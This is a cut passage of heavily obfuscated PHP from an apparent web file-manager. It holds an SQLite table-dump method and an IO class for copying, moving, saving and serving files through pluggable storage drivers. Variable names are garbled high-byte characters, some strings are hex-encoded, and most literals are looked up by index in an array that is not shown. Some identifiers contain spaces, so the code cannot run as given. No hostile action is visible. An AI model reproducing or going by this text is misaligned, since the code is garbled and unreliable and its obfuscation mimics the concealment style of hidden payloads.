$œİä”ÍÄ, $¤µö«İë[13] => $‰À¨ñ´î); return $éïŠà÷¹ ? $¬üš•õ¨[$éïŠà÷¹] : $¬üš•õ¨; } public function sqlFromSqlite($©Ê–êÓŞ, $ª‚š¡¿ = '') { $¡ò­ıóö =& $_SERVER[¥Ÿ©ÒèÌ]; $ô—ˆì¾“ = $this->model()->db(); $±£ÂíÃÂ = "\x50\122\101\x47\115\x41\40\x54\101\x42\x4c\105\137\x49\x4e\x46\117\40\50\x27{$©Ê–êÓŞ}\x27\51"; $Àï¶¥ = "\x53\105\x4c\105\103\x54\x20\52\x20\106\122\x4f\x4d\x20\163\161\x6c\x69\164\x65\137\155\x61\x73\164\x65\x72\x20\127\110\x45\x52\105\x20\164\x62\x6c\x5f\156\x61\x6d\145\x20\x3d\40\47{$©Ê–êÓŞ}\47"; $ù´Ø¯Å = $ô—ˆì¾“->query($±£ÂíÃÂ); if (empty($ù´Ø¯Å)) { $²•›Ù’ = array($¡ò­ıóö[794] => $¡ò­ıóö[12], $¡ò­ıóö[13] => $¡ò­ıóö[12]); return $ª‚š¡¿ ? $²•›Ù’[$ª‚š¡¿] : $²•›Ù’; } $å½À¢Ë = $ô—ˆì¾“->query($Àï¶¥); $Ò§Ä×‡£ = $Ä¬Ç´î = array(); foreach ($å½À¢Ë as $‹ƒµØÃ‘) { if ($‹ƒµØÃ‘[$¡ò­ıóö[33]] == $¡ò­ıóö[283]) { $Ò§Ä×‡£[] = $‹ƒµØÃ‘[$¡ò­ıóö[1116]]; } else { $Ä¬Ç´î[$‹ƒµØÃ‘[$¡ò­ıóö[32]]] = $‹ƒµØÃ‘[$¡ò­ıóö[1116]]; } } $³Ïì½çƒ = array_merge(array($¡ò­ıóö[1112] . $©Ê–êÓŞ . $¡ò­ıóö[117]), $Ò§Ä×‡£, array_values($Ä¬Ç´î)); $³Ïì½çƒ = implode($¡ò­ıóö[71] . PHP_EOL, $³Ïì½çƒ) . $¡ò­ıóö[71]; if ($ª‚š¡¿ && $ª‚š¡¿ == $¡ò­ıóö[13]) { return $³Ïì½çƒ; } $Ö‰ûÌè´ = array(); $’ÆŞÌ´¿ = array($¡ò­ıóö[1104] => $¡ò­ıóö[1117], $¡ò­ıóö[319] => $¡ò­ıóö[1118]); $Ø²Á“ŞŞ = $¡ò­ıóö[12]; foreach ($ù´Ø¯Å as $‹ƒµØÃ‘) { if ($‹ƒµØÃ‘[$¡ò­ıóö[57]] == $¡ò­ıóö[89]) { $Ø²Á“ŞŞ = $‹ƒµØÃ‘[$¡ò­ıóö[32]]; } $Ì×²©÷ = array($¡ò­ıóö[389] . $‹ƒµØÃ‘[$¡ò­ıóö[32]] . $¡ò­ıóö[389], isset($’ÆŞÌ´¿[$‹ƒµØÃ‘[$¡ò­ıóö[33]]]) ? $’ÆŞÌ´¿[$‹ƒµØÃ‘[$¡ò­ıóö[33]]] : $‹ƒµØÃ‘[$¡ò­ıóö[33]], $‹ƒµØÃ‘[$¡ò­ıóö[35]] == $¡ò­ıóö[89] ? $¡ò­ıóö[1109] : $¡ò­ıóö[1119] . $‹ƒµØÃ‘[$¡ò­ıóö[56]], $‹ƒµØÃ‘[$¡ò­ıóö[57]] == $¡ò­ıóö[89] ? $¡ò­ıóö[1120] : $¡ò­ıóö[12]); $Ö‰ûÌè´[] = trim(implode($¡ò­ıóö[53], $Ì×²©÷)); } foreach ($Ä¬Ç´î as $âèšé¡— => $Í¹Ü‰’§) { $ªçÖ¼ÛÖ = str_replace($¡ò­ıóö[1121] . $©Ê–êÓŞ . $¡ò­ıóö[11], $¡ò­ıóö[12], $âèšé¡—); $ÁºË˜Æ = str_replace(array($¡ò­ıóö[117], $¡ò­ıóö[943]), $¡ò­ıóö[389], substr($Í¹Ü‰’§, stripos($Í¹Ü‰’§, $¡ò­ıóö[264]))); if ($ªçÖ¼ÛÖ == $¡ò­ıóö[1098]) { $À¡®èº¾ = $¡ò­ıóö[1122] . $Ø²Á“ŞŞ . $¡ò­ıóö[1123]; } else { $À¡®èº¾ = (stripos($ªçÖ¼ÛÖ, $¡ò­ıóö[11]) ? $¡ò­ıóö[1124] : $¡ò­ıóö[12]) . ($¡ò­ıóö[1125] . $ªçÖ¼ÛÖ . $¡ò­ıóö[1126] . $ÁºË˜Æ); } $Ö‰ûÌè´[] = $À¡®èº¾; } $ªÊæì¶ı = array($¡ò­ıóö[1127] . $©Ê–êÓŞ . $¡ò­ıóö[1128], $¡ò­ıóö[1129] . $©Ê–êÓŞ . $¡ò­ıóö[1130], implode($¡ò­ıóö[50] . PHP_EOL, $Ö‰ûÌè´), $¡ò­ıóö[1131]); $Åª†äƒ‘ = implode(PHP_EOL, $ªÊæì¶ı); if ($ª‚š¡¿ && $ª‚š¡¿ == $¡ò­ıóö[794]) { return $Åª†äƒ‘; } $²•›Ù’ = array($¡ò­ıóö[794] => $Åª†äƒ‘, $¡ò­ıóö[13] => $³Ïì½çƒ); return $ª‚š¡¿ ? $²•›Ù’[$ª‚š¡¿] : $²•›Ù’; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($£µ’™êş, $ğàó—Ûõ) { $–ìÊÀ×· =& $_SERVER[¥Ÿ©ÒèÌ]; $”Š®Å‘· = $ğàó—Ûõ; $GLOBALS[$–ìÊÀ×·[1132]] = $–ìÊÀ×·[1133] . $£µ’™êş; Hook::trigger($–ìÊÀ×·[1133] . $£µ’™êş . $–ìÊÀ×·[1134], $”Š®Å‘·); $òÑ˜ç´ = self::driverMake($ğàó—Ûõ[0]); if (!$òÑ˜ç´) { return !1; } if (method_exists($òÑ˜ç´, $£µ’™êş)) { $üèœ’à± = @call_user_func_array(array($òÑ˜ç´, $£µ’™êş), $ğàó—Ûõ); } else { if (method_exists($òÑ˜ç´, $–ìÊÀ×·[1135])) { $üèœ’à± = @call_user_func_array(array($òÑ˜ç´, $£µ’™êş), $ğàó—Ûõ); } else { if (method_exists(self, $£µ’™êş)) { $üèœ’à± = @call_user_func_array(array(self, $£µ’™êş), $ğàó—Ûõ); } else { $üèœ’à± = call_user_func_array(array(parent, $£µ’™êş), $ğàó—Ûõ); } } } Hook::trigger($–ìÊÀ×·[1133] . $£µ’™êş . $–ìÊÀ×·[1136], $”Š®Å‘·, $üèœ’à±); return $üèœ’à±; } public static function init($çÜòáóõ) { return self::driverMake($çÜòáóõ); } public static function copy($ñï×û¾, $ƒ‚¥î¯–, $©õÀó = false, $½ÌáÊÛµ = false) { return self::copyMoveStart($ñï×û¾, $ƒ‚¥î¯–, $©õÀó, $_SERVER[¥Ÿ©ÒèÌ][549], $½ÌáÊÛµ); } public static function move($ïÂïÃ, $Û¡Ç‰ò, $­•¹¿Øü = false, $ß§Í»Ü« = false) { return self::copyMoveStart($ïÂïÃ, $Û¡Ç‰ò, $­•¹¿Øü, $_SERVER[¥Ÿ©ÒèÌ][551], $ß§Í»Ü«); } private static function copyMoveStart($ÁÅ¾’óè, $å”§öÎ˜, $´ˆ‰¯, $€Èæßş¤, $®ä€öª–) { $‡‘’ÖƒŒ =& $_SERVER[¥Ÿ©ÒèÌ]; $ šØÓ³ê = array($ÁÅ¾’óè, $å”§öÎ˜, $´ˆ‰¯, $®ä€öª–); Hook::trigger($‡‘’ÖƒŒ[1133] . $€Èæßş¤ . $‡‘’ÖƒŒ[1134], $ šØÓ³ê); $†Ø“Õˆë = self::copyMove($ÁÅ¾’óè, $å”§öÎ˜, $´ˆ‰¯, $€Èæßş¤, $®ä€öª–); Hook::trigger($‡‘’ÖƒŒ[1133] . $€Èæßş¤ . $‡‘’ÖƒŒ[1136], $ šØÓ³ê, $†Ø“Õˆë); return $†Ø“Õˆë; } public static function saveFile($É¾³–, $‰Ë«¤«…, $’úô¹òĞ = true) { $¸ÅÁğ·€ =& $_SERVER[¥Ÿ©ÒèÌ]; $£°ôêŞÉ = self::info($‰Ë«¤«…); $·Ïıº²ö = self::driverMake($É¾³–); $Šà¼šÍê = self::driverMake($‰Ë«¤«…); $ÉİÑ¨Ê÷ = !1; if ($Šà¼šÍê->pathParse[$¸ÅÁğ·€[1137]]) { $ÉİÑ¨Ê÷ = $Šà¼šÍê; $Äñí–Ú = $Šà¼šÍê->pathParse[$¸ÅÁğ·€[1137]]; $Šà¼šÍê = self::driverMake($Äñí–Ú); } if ($·Ïıº²ö->pathParse[$¸ÅÁğ·€[1137]]) { $­Šñ†‰æ = $·Ïıº²ö->pathParse[$¸ÅÁğ·€[1137]]; $·Ïıº²ö = self::driverMake($­Šñ†‰æ); } $ó¨¨àß = $Šà¼šÍê->pathFather($‰Ë«¤«…); $éÀŸ¹ÅÃ = !0; if (!$’úô¹òĞ && self::driverIsSame($·Ïıº²ö, $Šà¼šÍê)) { $éÀŸ¹ÅÃ = !1; } $ùÁí€ìõ = self::copyFile($·Ïıº²ö, $É¾³–, $Šà¼šÍê, $ó¨¨àß, $£°ôêŞÉ[$¸ÅÁğ·€[32]], $éÀŸ¹ÅÃ); if ($ÉİÑ¨Ê÷) { $ùÁí€ìõ = $ÉİÑ¨Ê÷->getPathOuter($ùÁí€ìõ); } return $ùÁí€ìõ; } private static function copyMove($¥û¹¶öä, $ÖËƒÔĞî, $¯ó Ç, $†’ş¶¬‡, $àäÛ¯‰ë = false) { $ˆØ™¨ö =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$¥û¹¶öä || $¥û¹¶öä == $ˆØ™¨ö[8] || !$ÖËƒÔĞî) { return !1; } ignore_timeout(); $“¹©ßÜÈ = self::driverMake($¥û¹¶öä); $Üßü€‚ = self::driverMake($ÖËƒÔĞî); $µæ€ÚÀ¥ = $†’ş¶¬‡ == $ˆØ™¨ö[551]; $˜æ¬¿¡ó = !1; if ($Üßü€‚->pathParse[$ˆØ™¨ö[1137]]) { $˜æ¬¿¡ó = $Üßü€‚; $ÖËƒÔĞî = $Üßü€‚->pathParse[$ˆØ™¨ö[1137]]; $Üßü€‚ = self::driverMake($ÖËƒÔĞî); } if ($“¹©ßÜÈ->pathParse[$ˆØ™¨ö[1137]]) { $¥û¹¶öä = $“¹©ßÜÈ->pathParse[$ˆØ™¨ö[1137]]; $“¹©ßÜÈ = self::driverMake($¥û¹¶öä); } self::check($“¹©ßÜÈ, $¥û¹¶öä, $Üßü€‚, $ÖËƒÔĞî); Hook::trigger($ˆØ™¨ö[75], $“¹©ßÜÈ, $¥û¹¶öä, $Üßü€‚, $ÖËƒÔĞî); $‹äı®ğ = self::driverIsSame($“¹©ßÜÈ, $Üßü€‚); if ($‹äı®ğ) { if ($†’ş¶¬‡ == $ˆØ™¨ö[551] && !method_exists($Üßü€‚, $ˆØ™¨ö[1138]) && trim($ÖËƒÔĞî, $ˆØ™¨ö[8]) == trim($Üßü€‚->pathFather($¥û¹¶öä), $ˆØ™¨ö[8])) { if ($“¹©ßÜÈ->pathThis($¥û¹¶öä) != $àäÛ¯‰ë && !$“¹©ßÜÈ->isTypeObject()) { return $“¹©ßÜÈ->rename($¥û¹¶öä, $àäÛ¯‰ë); } return $Üßü€‚->getPathOuter($¥û¹¶öä); } if (method_exists($Üßü€‚, $†’ş¶¬‡)) { return $Üßü€‚->{$†’ş¶¬‡}($¥û¹¶öä, $ÖËƒÔĞî, $¯ó Ç, $àäÛ¯‰ë); } } if ($‹äı®ğ && $†’ş¶¬‡ == $ˆØ™¨ö[551] && $Üßü€‚->getType() == $ˆØ™¨ö[107]) { $‰¦œšÅ½ = $Üßü€‚->movePath($¥û¹¶öä, $ÖËƒÔĞî, $àäÛ¯‰ë); if ($‰¦œšÅ½) { return $‰¦œšÅ½; } } $—±á° É = $“¹©ßÜÈ->isFile($¥û¹¶öä); if (!$—±á° É && $Üßü€‚->getType() == $ˆØ™¨ö[748] && $“¹©ßÜÈ->getType() == $ˆØ™¨ö[107]) { $‰¦œšÅ½ = $Üßü€‚->copyFolderFromIO($“¹©ßÜÈ, $¥û¹¶öä, $ÖËƒÔĞî, $¯ó Ç, $µæ€ÚÀ¥, $àäÛ¯‰ë); } else { $‰¦œšÅ½ = self::copyPath($“¹©ßÜÈ, $¥û¹¶öä, $Üßü€‚, $ÖËƒÔĞî, $¯ó Ç, $µæ€ÚÀ¥, $—±á° É, $àäÛ¯‰ë); } if ($‰¦œšÅ½ && $µæ€ÚÀ¥) { $“¹©ßÜÈ->remove($¥û¹¶öä); } if ($˜æ¬¿¡ó) { $‰¦œšÅ½ = $˜æ¬¿¡ó->getPathOuter($‰¦œšÅ½); } return $‰¦œšÅ½; } private static function check($ïç²”«, $ï£³Óì, $ñ§†š­, &$ÅÛï‰ÍÌ) { $Û¼ĞÒÄ =& $_SERVER[¥Ÿ©ÒèÌ]; if (self::driverIsSame($ïç²”«, $ñ§†š­) && $ïç²”«->isFolder($ï£³Óì) && $ïç²”«->isParentOf($ï£³Óì, $ÅÛï‰ÍÌ)) { show_json(LNG($Û¼ĞÒÄ[1139]), !1); } if (!$ïç²”«->exist($ï£³Óì)) { show_json(LNG($Û¼ĞÒÄ[106]), !1); } } private static function copyPath($×«êó—ë, $°ˆ—ÊÄ, $ı’›·Ì, $ å»„’Ö, $âÒ‰úŸ, $Ï»ÌÖêù, $ƒášºı‹, $Òœ‰¸è° = false) { $¶£õÌ‡é =& $_SERVER[¥Ÿ©ÒèÌ]; $Ø«âŞ¯Ê = empty($Òœ‰¸è°) && $Òœ‰¸è° !== $¶£õÌ‡é[190] ? $×«êó—ë->pathThis($°ˆ—ÊÄ) : $Òœ‰¸è°; if ($âÒ‰úŸ) { $òà‰è‰ = $ı’›·Ì->fileNameExist($ å»„’Ö, $Ø«âŞ¯Ê); $Ø«âŞ¯Ê = $ı’›·Ì->fileNameAuto($ å»„’Ö, $Ø«âŞ¯Ê, $âÒ‰úŸ, !$ƒášºı‹); $âÒ‰úŸ = $òà‰è‰ ? $âÒ‰úŸ : !1; } if ($ƒášºı‹) { return self::copyFile($×«êó—ë, $°ˆ—ÊÄ, $ı’›·Ì, $ å»„’Ö, $Ø«âŞ¯Ê, $Ï»ÌÖêù); } if ($âÒ‰úŸ == REPEAT_RENAME_FOLDER) { $âÒ‰úŸ = !1; } $¾š¿³˜ø = rtrim($ å»„’Ö, $¶£õÌ‡é[8]) . $¶£õÌ‡é[8] . $Ø«âŞ¯Ê; $•ÊœúŞğ = $ı’›·Ì->mkdir($ı’›·Ì->getPath($¾š¿³˜ø)); $ å»„’Ö = $ı’›·Ì->getPathInner($•ÊœúŞğ); $¯ÎåŠ›³ = $×«êó—ë->listPath($°ˆ—ÊÄ, !0); $¯ÎåŠ›³ = is_array($¯ÎåŠ›³) ? $¯ÎåŠ›³ : array($¶£õÌ‡é[76] => array(), $¶£õÌ‡é[77] => array()); $¼ÄÓ¿„ = array_merge($¯ÎåŠ›³[$¶£õÌ‡é[76]], $¯ÎåŠ›³[$¶£õÌ‡é[77]]); foreach ($¼ÄÓ¿„ as $ÒÑúá¡š) { $öµÙÖ›í = $ÒÑúá¡š[$¶£õÌ‡é[33]] == $¶£õÌ‡é[192]; $°ˆ—ÊÄ = $×«êó—ë->getPathInner($ÒÑúá¡š[$¶£õÌ‡é[78]]); $ûÉà˜¿ä = self::copyPath($×«êó—ë, $°ˆ—ÊÄ, $ı’›·Ì, $ å»„’Ö, $âÒ‰úŸ, $Ï»ÌÖêù, $öµÙÖ›í); if (!$ûÉà˜¿ä) { IO::errorTips($¶£õÌ‡é[1140] . $°ˆ—ÊÄ . $¶£õÌ‡é[70] . $ å»„’Ö); } } self::copyMoveKeepInfo($×«êó—ë, $°ˆ—ÊÄ, $•ÊœúŞğ); return $•ÊœúŞğ; } private static function copyFile($Ìïôİï, $Ø¢µ¡Ã…, $ºŠ¯İ÷, $‹¾‰™¾¿, $œ€˜ÜŞ™, $¢ƒí¹¡) { $õÎô¼Ê× =& $_SERVER[¥Ÿ©ÒèÌ]; $‹¾‰™¾¿ = $ºŠ¯İ÷->getPath(rtrim($‹¾‰™¾¿, $õÎô¼Ê×[8]) . $õÎô¼Ê×[8] . $œ€˜ÜŞ™); $á™˜®Â = $õÎô¼Ê×[1141] . time() . rand_string(5); Hook::trigger($õÎô¼Ê×[1142], $Ìïôİï, $Ø¢µ¡Ã…, $ºŠ¯İ÷, $‹¾‰™¾¿, $œ€˜ÜŞ™, $á™˜®Â); if (self::driverIsSame($Ìïôİï, $ºŠ¯İ÷)) { if ($¢ƒí¹¡) { $í³ÎÕ¥À = $ºŠ¯İ÷->moveFile($Ø¢µ¡Ã…, $‹¾‰™¾¿); } else { $í³ÎÕ¥À = $ºŠ¯İ÷->copyFile($Ø¢µ¡Ã…, $‹¾‰™¾¿); } Hook::trigger($õÎô¼Ê×[1143], $Ìïôİï, $Ø¢µ¡Ã…, $ºŠ¯İ÷, $‹¾‰™¾¿, $œ€˜ÜŞ™, $í³ÎÕ¥À); self::copyMoveKeepInfo($Ìïôİï, $Ø¢µ¡Ã…, $í³ÎÕ¥À); return $í³ÎÕ¥À; } $îãàúğñ = TEMP_FILES; if ($GLOBALS[$õÎô¼Ê×[6]][$õÎô¼Ê×[90]][$õÎô¼Ê×[786]]) { $îãàúğñ = $GLOBALS[$õÎô¼Ê×[6]][$õÎô¼Ê×[90]][$õÎô¼Ê×[786]]; } $Ÿ‚úü•Œ = $îãàúğñ; mk_dir($Ÿ‚úü•Œ); $È£²çï¤ = $Ÿ‚úü•Œ . $á™˜®Â; $ø”Ç†Ö¨ = $È£²çï¤; $È£²çï¤ = $Ìïôİï->download($Ø¢µ¡Ã…, $È£²çï¤); $È£²çï¤ = $Ìïôİï->iconvApp($È£²çï¤); if (substr($È£²çï¤, strlen($îãàúğñ)) == $îãàúğñ) { $¢ƒí¹¡ = !0; } $í³ÎÕ¥À = $ºŠ¯İ÷->upload($‹¾‰™¾¿, $È£²çï¤, $¢ƒí¹¡); self::remove($ø”Ç†Ö¨); Hook::trigger($õÎô¼Ê×[1143], $Ìïôİï, $Ø¢µ¡Ã…, $ºŠ¯İ÷, $‹¾‰™¾¿, $œ€˜ÜŞ™, $í³ÎÕ¥À); self::copyMoveKeepInfo($Ìïôİï, $Ø¢µ¡Ã…, $í³ÎÕ¥À); return $í³ÎÕ¥À; } private static function copyMoveKeepInfo($ˆï–ëÄ, $ê£Úûø», $Ó÷ñ±úÚ) { if (!$Ó÷ñ±úÚ) { return; } $š½Åá‘’ = $ˆï–ëÄ->info($ê£Úûø»); if (!is_array($š½Åá‘’)) { return; } IO::setModifyTime($Ó÷ñ±úÚ, $š½Åá‘’[$_SERVER[¥Ÿ©ÒèÌ][86]]); } public static function pathFather($Ä¼À¡ş) { $¸©í©çÓ = IO::init($Ä¼À¡ş); $Ì×Õ = $¸©í©çÓ->pathFather($¸©í©çÓ->path); return $¸©í©çÓ->getPathOuter($Ì×Õ); } public static function fileOut($îÙ™ğĞ, $õÎ£·ğƒ = false, $‘É‚  = false, $Š¸«óƒ = '') { $ƒ–¶¼Û = self::driverMake($îÙ™ğĞ); if ($ƒ–¶¼Û->isFileOutServer()) { return $ƒ–¶¼Û->fileOutServer($îÙ™ğĞ, $õÎ£·ğƒ, $‘É‚ , $Š¸«óƒ); } return $ƒ–¶¼Û->fileOut($îÙ™ğĞ, $õÎ£·ğƒ, $‘É‚ , $Š¸«óƒ); } public static function fileOutImage($ú‹µ¶˜Õ, $£°øØÚ = 250) { $çŒÜı—® = array(250, 600, 1200, 2000, 3000, 5000); for ($È“ëÌÀ = 0; $È“ëÌÀ < count($çŒÜı—®); $È“ëÌÀ++) { if ($È“ëÌÀ == 0 && $£°øØÚ <= $çŒÜı—®[$È“ëÌÀ]) { $£°øØÚ = $çŒÜı—®[$È“ëÌÀ]; break; } else { if ($£°øØÚ > $çŒÜı—®[$È“ëÌÀ - 1] && $£°øØÚ <= $çŒÜı—®[$È“ëÌÀ]) { $£°øØÚ = $çŒÜı—®[$È“ëÌÀ]; break; } else { if ($È“ëÌÀ == count($çŒÜı—®) - 1 && $£°øØÚ > $çŒÜı—®[$È“ëÌÀ]) { $£°øØÚ = $çŒÜı—®[$È“ëÌÀ]; break; } } } } $™Í±ç„é = self::driverMake($ú‹µ¶˜Õ); if ($™Í±ç„é->isFileOutServer()) { return $™Í±ç„é->fileOutImageServer($ú‹µ¶˜Õ, $£°øØÚ); } return $™Í±ç„é->fileOutImage($ú‹µ¶˜Õ, $£°øØÚ); } private static function driverIsSame($ìà¨ĞÂ§, $’ÖÚÎ¤Š) { $‰ñ„¹œ¾ =& $_SERVER[¥Ÿ©ÒèÌ]; $¡èİ¹ú  = $ìà¨ĞÂ§->getType(); $°ğì÷ÅÑ = $’ÖÚÎ¤Š->getType(); if ($¡èİ¹ú  != $°ğì÷ÅÑ) { return !1; } if ($¡èİ¹ú  == $‰ñ„¹œ¾[748]) { return !0; } if ($¡èİ¹ú  == $‰ñ„¹œ¾[107]) { return !0; } if ($ìà¨ĞÂ§->pathDriver == $’ÖÚÎ¤Š->pathDriver) { return !0; } return !1; } public static function copyUpdate($÷èÎì, $¥©®å÷“) { $öï²Ş–Ã =& $_SERVER[¥Ÿ©ÒèÌ]; if (!IO::exist($÷èÎì)) { return !1; } if (!IO::exist($¥©®å÷“)) { IO::mkdir($¥©®å÷“); } $¯Œ‡¥Ì = self::_listAll($÷èÎì); $’ÖµŠîÏ = self::_listAll($¥©®å÷“); $Àü“Ô¶ = array(); $ÇÆ‹ÜÇš = array(); foreach ($¯Œ‡¥Ì as $Ï±«çÖ– => $ïÍı¥è¤) { if (isset($’ÖµŠîÏ[$Ï±«çÖ–])) { if ($ïÍı¥è¤[$öï²Ş–Ã[79]] == 1) { continue; } if ($’ÖµŠîÏ[$Ï±«çÖ–][$öï²Ş–Ã[80]] == $ïÍı¥è¤[$öï²Ş–Ã[80]]) { continue; } } if ($ïÍı¥è¤[$öï²Ş–Ã[79]] == 1) { $ÇÆ‹ÜÇš[] = $¥©®å÷“ . $öï²Ş–Ã[8] . $Ï±«çÖ–; continue; } $ƒÕä¦û– = strstr(trim($Ï±«çÖ–, $öï²Ş–Ã[8]), $öï²Ş–Ã[8]) ? get_path_father($Ï±«çÖ–) : $öï²Ş–Ã[12]; $Àü“Ô¶[] = array($öï²Ş–Ã[1144] => $ïÍı¥è¤[$öï²Ş–Ã[78]], $öï²Ş–Ã[1145] => rtrim($¥©®å÷“, $öï²Ş–Ã[8]) . $öï²Ş–Ã[8] . $ƒÕä¦û–, $öï²Ş–Ã[1146] => $ïÍı¥è¤); } $‰ş•ÅğÃ = array($öï²Ş–Ã[192] => $Àü“Ô¶, $öï²Ş–Ã[79] => $ÇÆ‹ÜÇš); Hook::trigger($öï²Ş–Ã[1147], $÷èÎì, $¥©®å÷“, $‰ş•ÅğÃ); foreach ($ÇÆ‹ÜÇš as $ïÍı¥è¤) { IO::mkdir($ïÍı¥è¤); } foreach ($Àü“Ô¶ as $ïÍı¥è¤) { IO::copy($ïÍı¥è¤[$öï²Ş–Ã[1144]], $ïÍı¥è¤[$öï²Ş–Ã[1145]], REPEAT_REPLACE); } } private static function _listAll($±„’ÂËŒ) { $Í‡õŸ©€ =& $_SERVER[¥Ÿ©ÒèÌ]; $±„’ÂËŒ = KodIO::clear($±„’ÂËŒ); $ƒµŒşŠü = IO::listAll($±„’ÂËŒ); foreach ($ƒµŒşŠü as &$—÷ã±îØ) { $ô‰ïÓ¶ç = substr($—÷ã±îØ[$Í‡õŸ©€[78]], strlen($±„’ÂËŒ)); $—÷ã±îØ[$Í‡õŸ©€[1148]] = trim($ô‰ïÓ¶ç, $Í‡õŸ©€[8]); } unset($—÷ã±îØ); return array_to_keyvalue($ƒµŒşŠü, $Í‡õŸ©€[1148]); } public static function fileSubstr($ÈÑ»‘Ã†, $óÀÙ€‚˜, $ÚÕæ ° = false) { $¾šê®ïï =& $_SERVER[¥Ÿ©ÒèÌ]; $±ÏåÃ”‹ = self::driverMake($ÈÑ»‘Ã†); $ğœûÚ = $±ÏåÃ”‹->size($ÈÑ»‘Ã†); $Ïöâ””Ğ = $óÀÙ€‚˜; $³äÑÔ´¶ = $ÚÕæ °; if ($óÀÙ€‚˜ < 0) { $óÀÙ€‚˜ = $ğœûÚ + $óÀÙ€‚˜; } if ($ÚÕæ ° === !1) { $ÚÕæ ° = $ğœûÚ - $óÀÙ€‚˜; } if ($óÀÙ€‚˜ + $ÚÕæ ° > $ğœûÚ) { $ÚÕæ ° = $ğœûÚ - $óÀÙ€‚˜; } if (!$ğœûÚ && $±ÏåÃ”‹->getType() == $¾šê®ïï[107] && !$±ÏåÃ”‹->exist($ÈÑ»‘Ã†)) { throw new Exception($¾šê®ïï[1149] . LNG($¾šê®ïï[1150]) . $¾šê®ïï[952] . get_path_this($ÈÑ»‘Ã†) . $¾šê®ïï[12]); } if ($ÚÕæ ° <= 0) { return $¾šê®ïï[12]; } if ($óÀÙ€‚˜ < 0 || $óÀÙ€‚˜ >= $ğœûÚ || $ÚÕæ ° > 1024 * 1024 * 10) { throw new Exception("\146\151\x6c\145\122\145\x61\144\x20\145\x72\x72\x6f\162\x21\x20\x73\164\141\x72\164\75{$óÀÙ€‚˜}\73\154\145\156\147\x74\150\x3d{$ÚÕæ °}\73\40\x73\x69\172\145\75{$ğœûÚ}\73"); } $ÅÙğÃ²¾ = $±ÏåÃ”‹->fileSubstr($ÈÑ»‘Ã†, $óÀÙ€‚˜, $ÚÕæ °); if (!$ÅÙğÃ²¾ && $ÚÕæ ° && isset($GLOBALS[$¾šê®ïï[1151]])) { throw new Exception($GLOBALS[$¾šê®ïï[1151]][$¾šê®ïï[1152]]); } return $ÅÙğÃ²¾; } private static function driverMake(&$íÑ»×Ç‰) { $•ŠØ¶Ê¢ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ã‡šï¼ê = KodIO::parse($íÑ»×Ç‰); if (!self::$driverListSystem) { $Û‚ˆÆåˆ = Model($•ŠØ¶Ê¢[757])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($Û‚ˆÆåˆ, $•ŠØ¶Ê¢[401]); } if ($Ã‡šï¼ê[$•ŠØ¶Ê¢[33]] == KodIO::KOD_IO && !self::$driverListSystem[$Ã‡šï¼ê[$•ŠØ¶Ê¢[401]]]) { return !1; } $íÑ»×Ç‰ = $Ã‡šï¼ê[$•ŠØ¶Ê¢[1153]]; $Š‘Ò³Œ = self::driverGet($Ã‡šï¼ê, $íÑ»×Ç‰); return $Š‘Ò³Œ; } private static function driverGet($³ŞÇ«ÙÇ, &$ÍŒÎŸŠ) { $—¿¿¯Ï =& $_SERVER[¥Ÿ©ÒèÌ]; $“‚ûï°­ = $³ŞÇ«ÙÇ[$—¿¿¯Ï[1154]]; $ØœŸ­ø = $³ŞÇ«ÙÇ[$—¿¿¯Ï[401]]; switch ($³ŞÇ«ÙÇ[$—¿¿¯Ï[33]]) { case KodIO::KOD_IO: $¡ÈàÙÕ = self::$driverListSystem[$ØœŸ­ø]; break; case KodIO::KOD_SOURCE: $ÍŒÎŸŠ = $ØœŸ­ø . $ÍŒÎŸŠ; $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => $—¿¿¯Ï[1156], $—¿¿¯Ï[6] => $³ŞÇ«ÙÇ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $‹£«Áğê = $GLOBALS[$—¿¿¯Ï[1157]]; self::$driverListUser = array_to_keyvalue($‹£«Áğê, $—¿¿¯Ï[401]); } $¡ÈàÙÕ = self::$driverListUser[$ØœŸ­ø]; break; case KodIO::KOD_SHARE_LINK: $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => $—¿¿¯Ï[1158], $—¿¿¯Ï[6] => $³ŞÇ«ÙÇ); $·‰©†šç = Action($—¿¿¯Ï[1159])->sharePathInfo($³ŞÇ«ÙÇ[$—¿¿¯Ï[78]]); $ÍŒÎŸŠ = $·‰©†šç[$—¿¿¯Ï[403]]; if (!$·‰©†šç[$—¿¿¯Ï[403]]) { $’”Ì‡¨… = Model($—¿¿¯Ï[595])->getInfo($·‰©†šç[$—¿¿¯Ï[488]]); $ÍŒÎŸŠ = KodIO::clear($’”Ì‡¨…[$—¿¿¯Ï[1160]] . $³ŞÇ«ÙÇ[$—¿¿¯Ï[1153]]); $³ŞÇ«ÙÇ[$—¿¿¯Ï[486]] = $’”Ì‡¨…; $³ŞÇ«ÙÇ[$—¿¿¯Ï[1137]] = $ÍŒÎŸŠ; $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => $—¿¿¯Ï[1161], $—¿¿¯Ï[6] => $³ŞÇ«ÙÇ); } break; case KodIO::KOD_SHARE_ITEM: $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => $—¿¿¯Ï[1162], $—¿¿¯Ï[6] => $³ŞÇ«ÙÇ); $’”Ì‡¨… = Model($—¿¿¯Ï[595])->getInfo($³ŞÇ«ÙÇ[$—¿¿¯Ï[401]]); if ($’”Ì‡¨…[$—¿¿¯Ï[403]] == $—¿¿¯Ï[190]) { $ÍŒÎŸŠ = KodIO::clear($’”Ì‡¨…[$—¿¿¯Ï[1160]] . $³ŞÇ«ÙÇ[$—¿¿¯Ï[1153]]); $³ŞÇ«ÙÇ[$—¿¿¯Ï[486]] = $’”Ì‡¨…; $³ŞÇ«ÙÇ[$—¿¿¯Ï[1137]] = $ÍŒÎŸŠ; $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => $—¿¿¯Ï[1163], $—¿¿¯Ï[6] => $³ŞÇ«ÙÇ); } else { if (!$ÍŒÎŸŠ) { $ÍŒÎŸŠ = $’”Ì‡¨…[$—¿¿¯Ï[403]]; } } break; default: $ÍŒÎŸŠ = $³ŞÇ«ÙÇ[$—¿¿¯Ï[78]]; $¡ÈàÙÕ = array($—¿¿¯Ï[1155] => 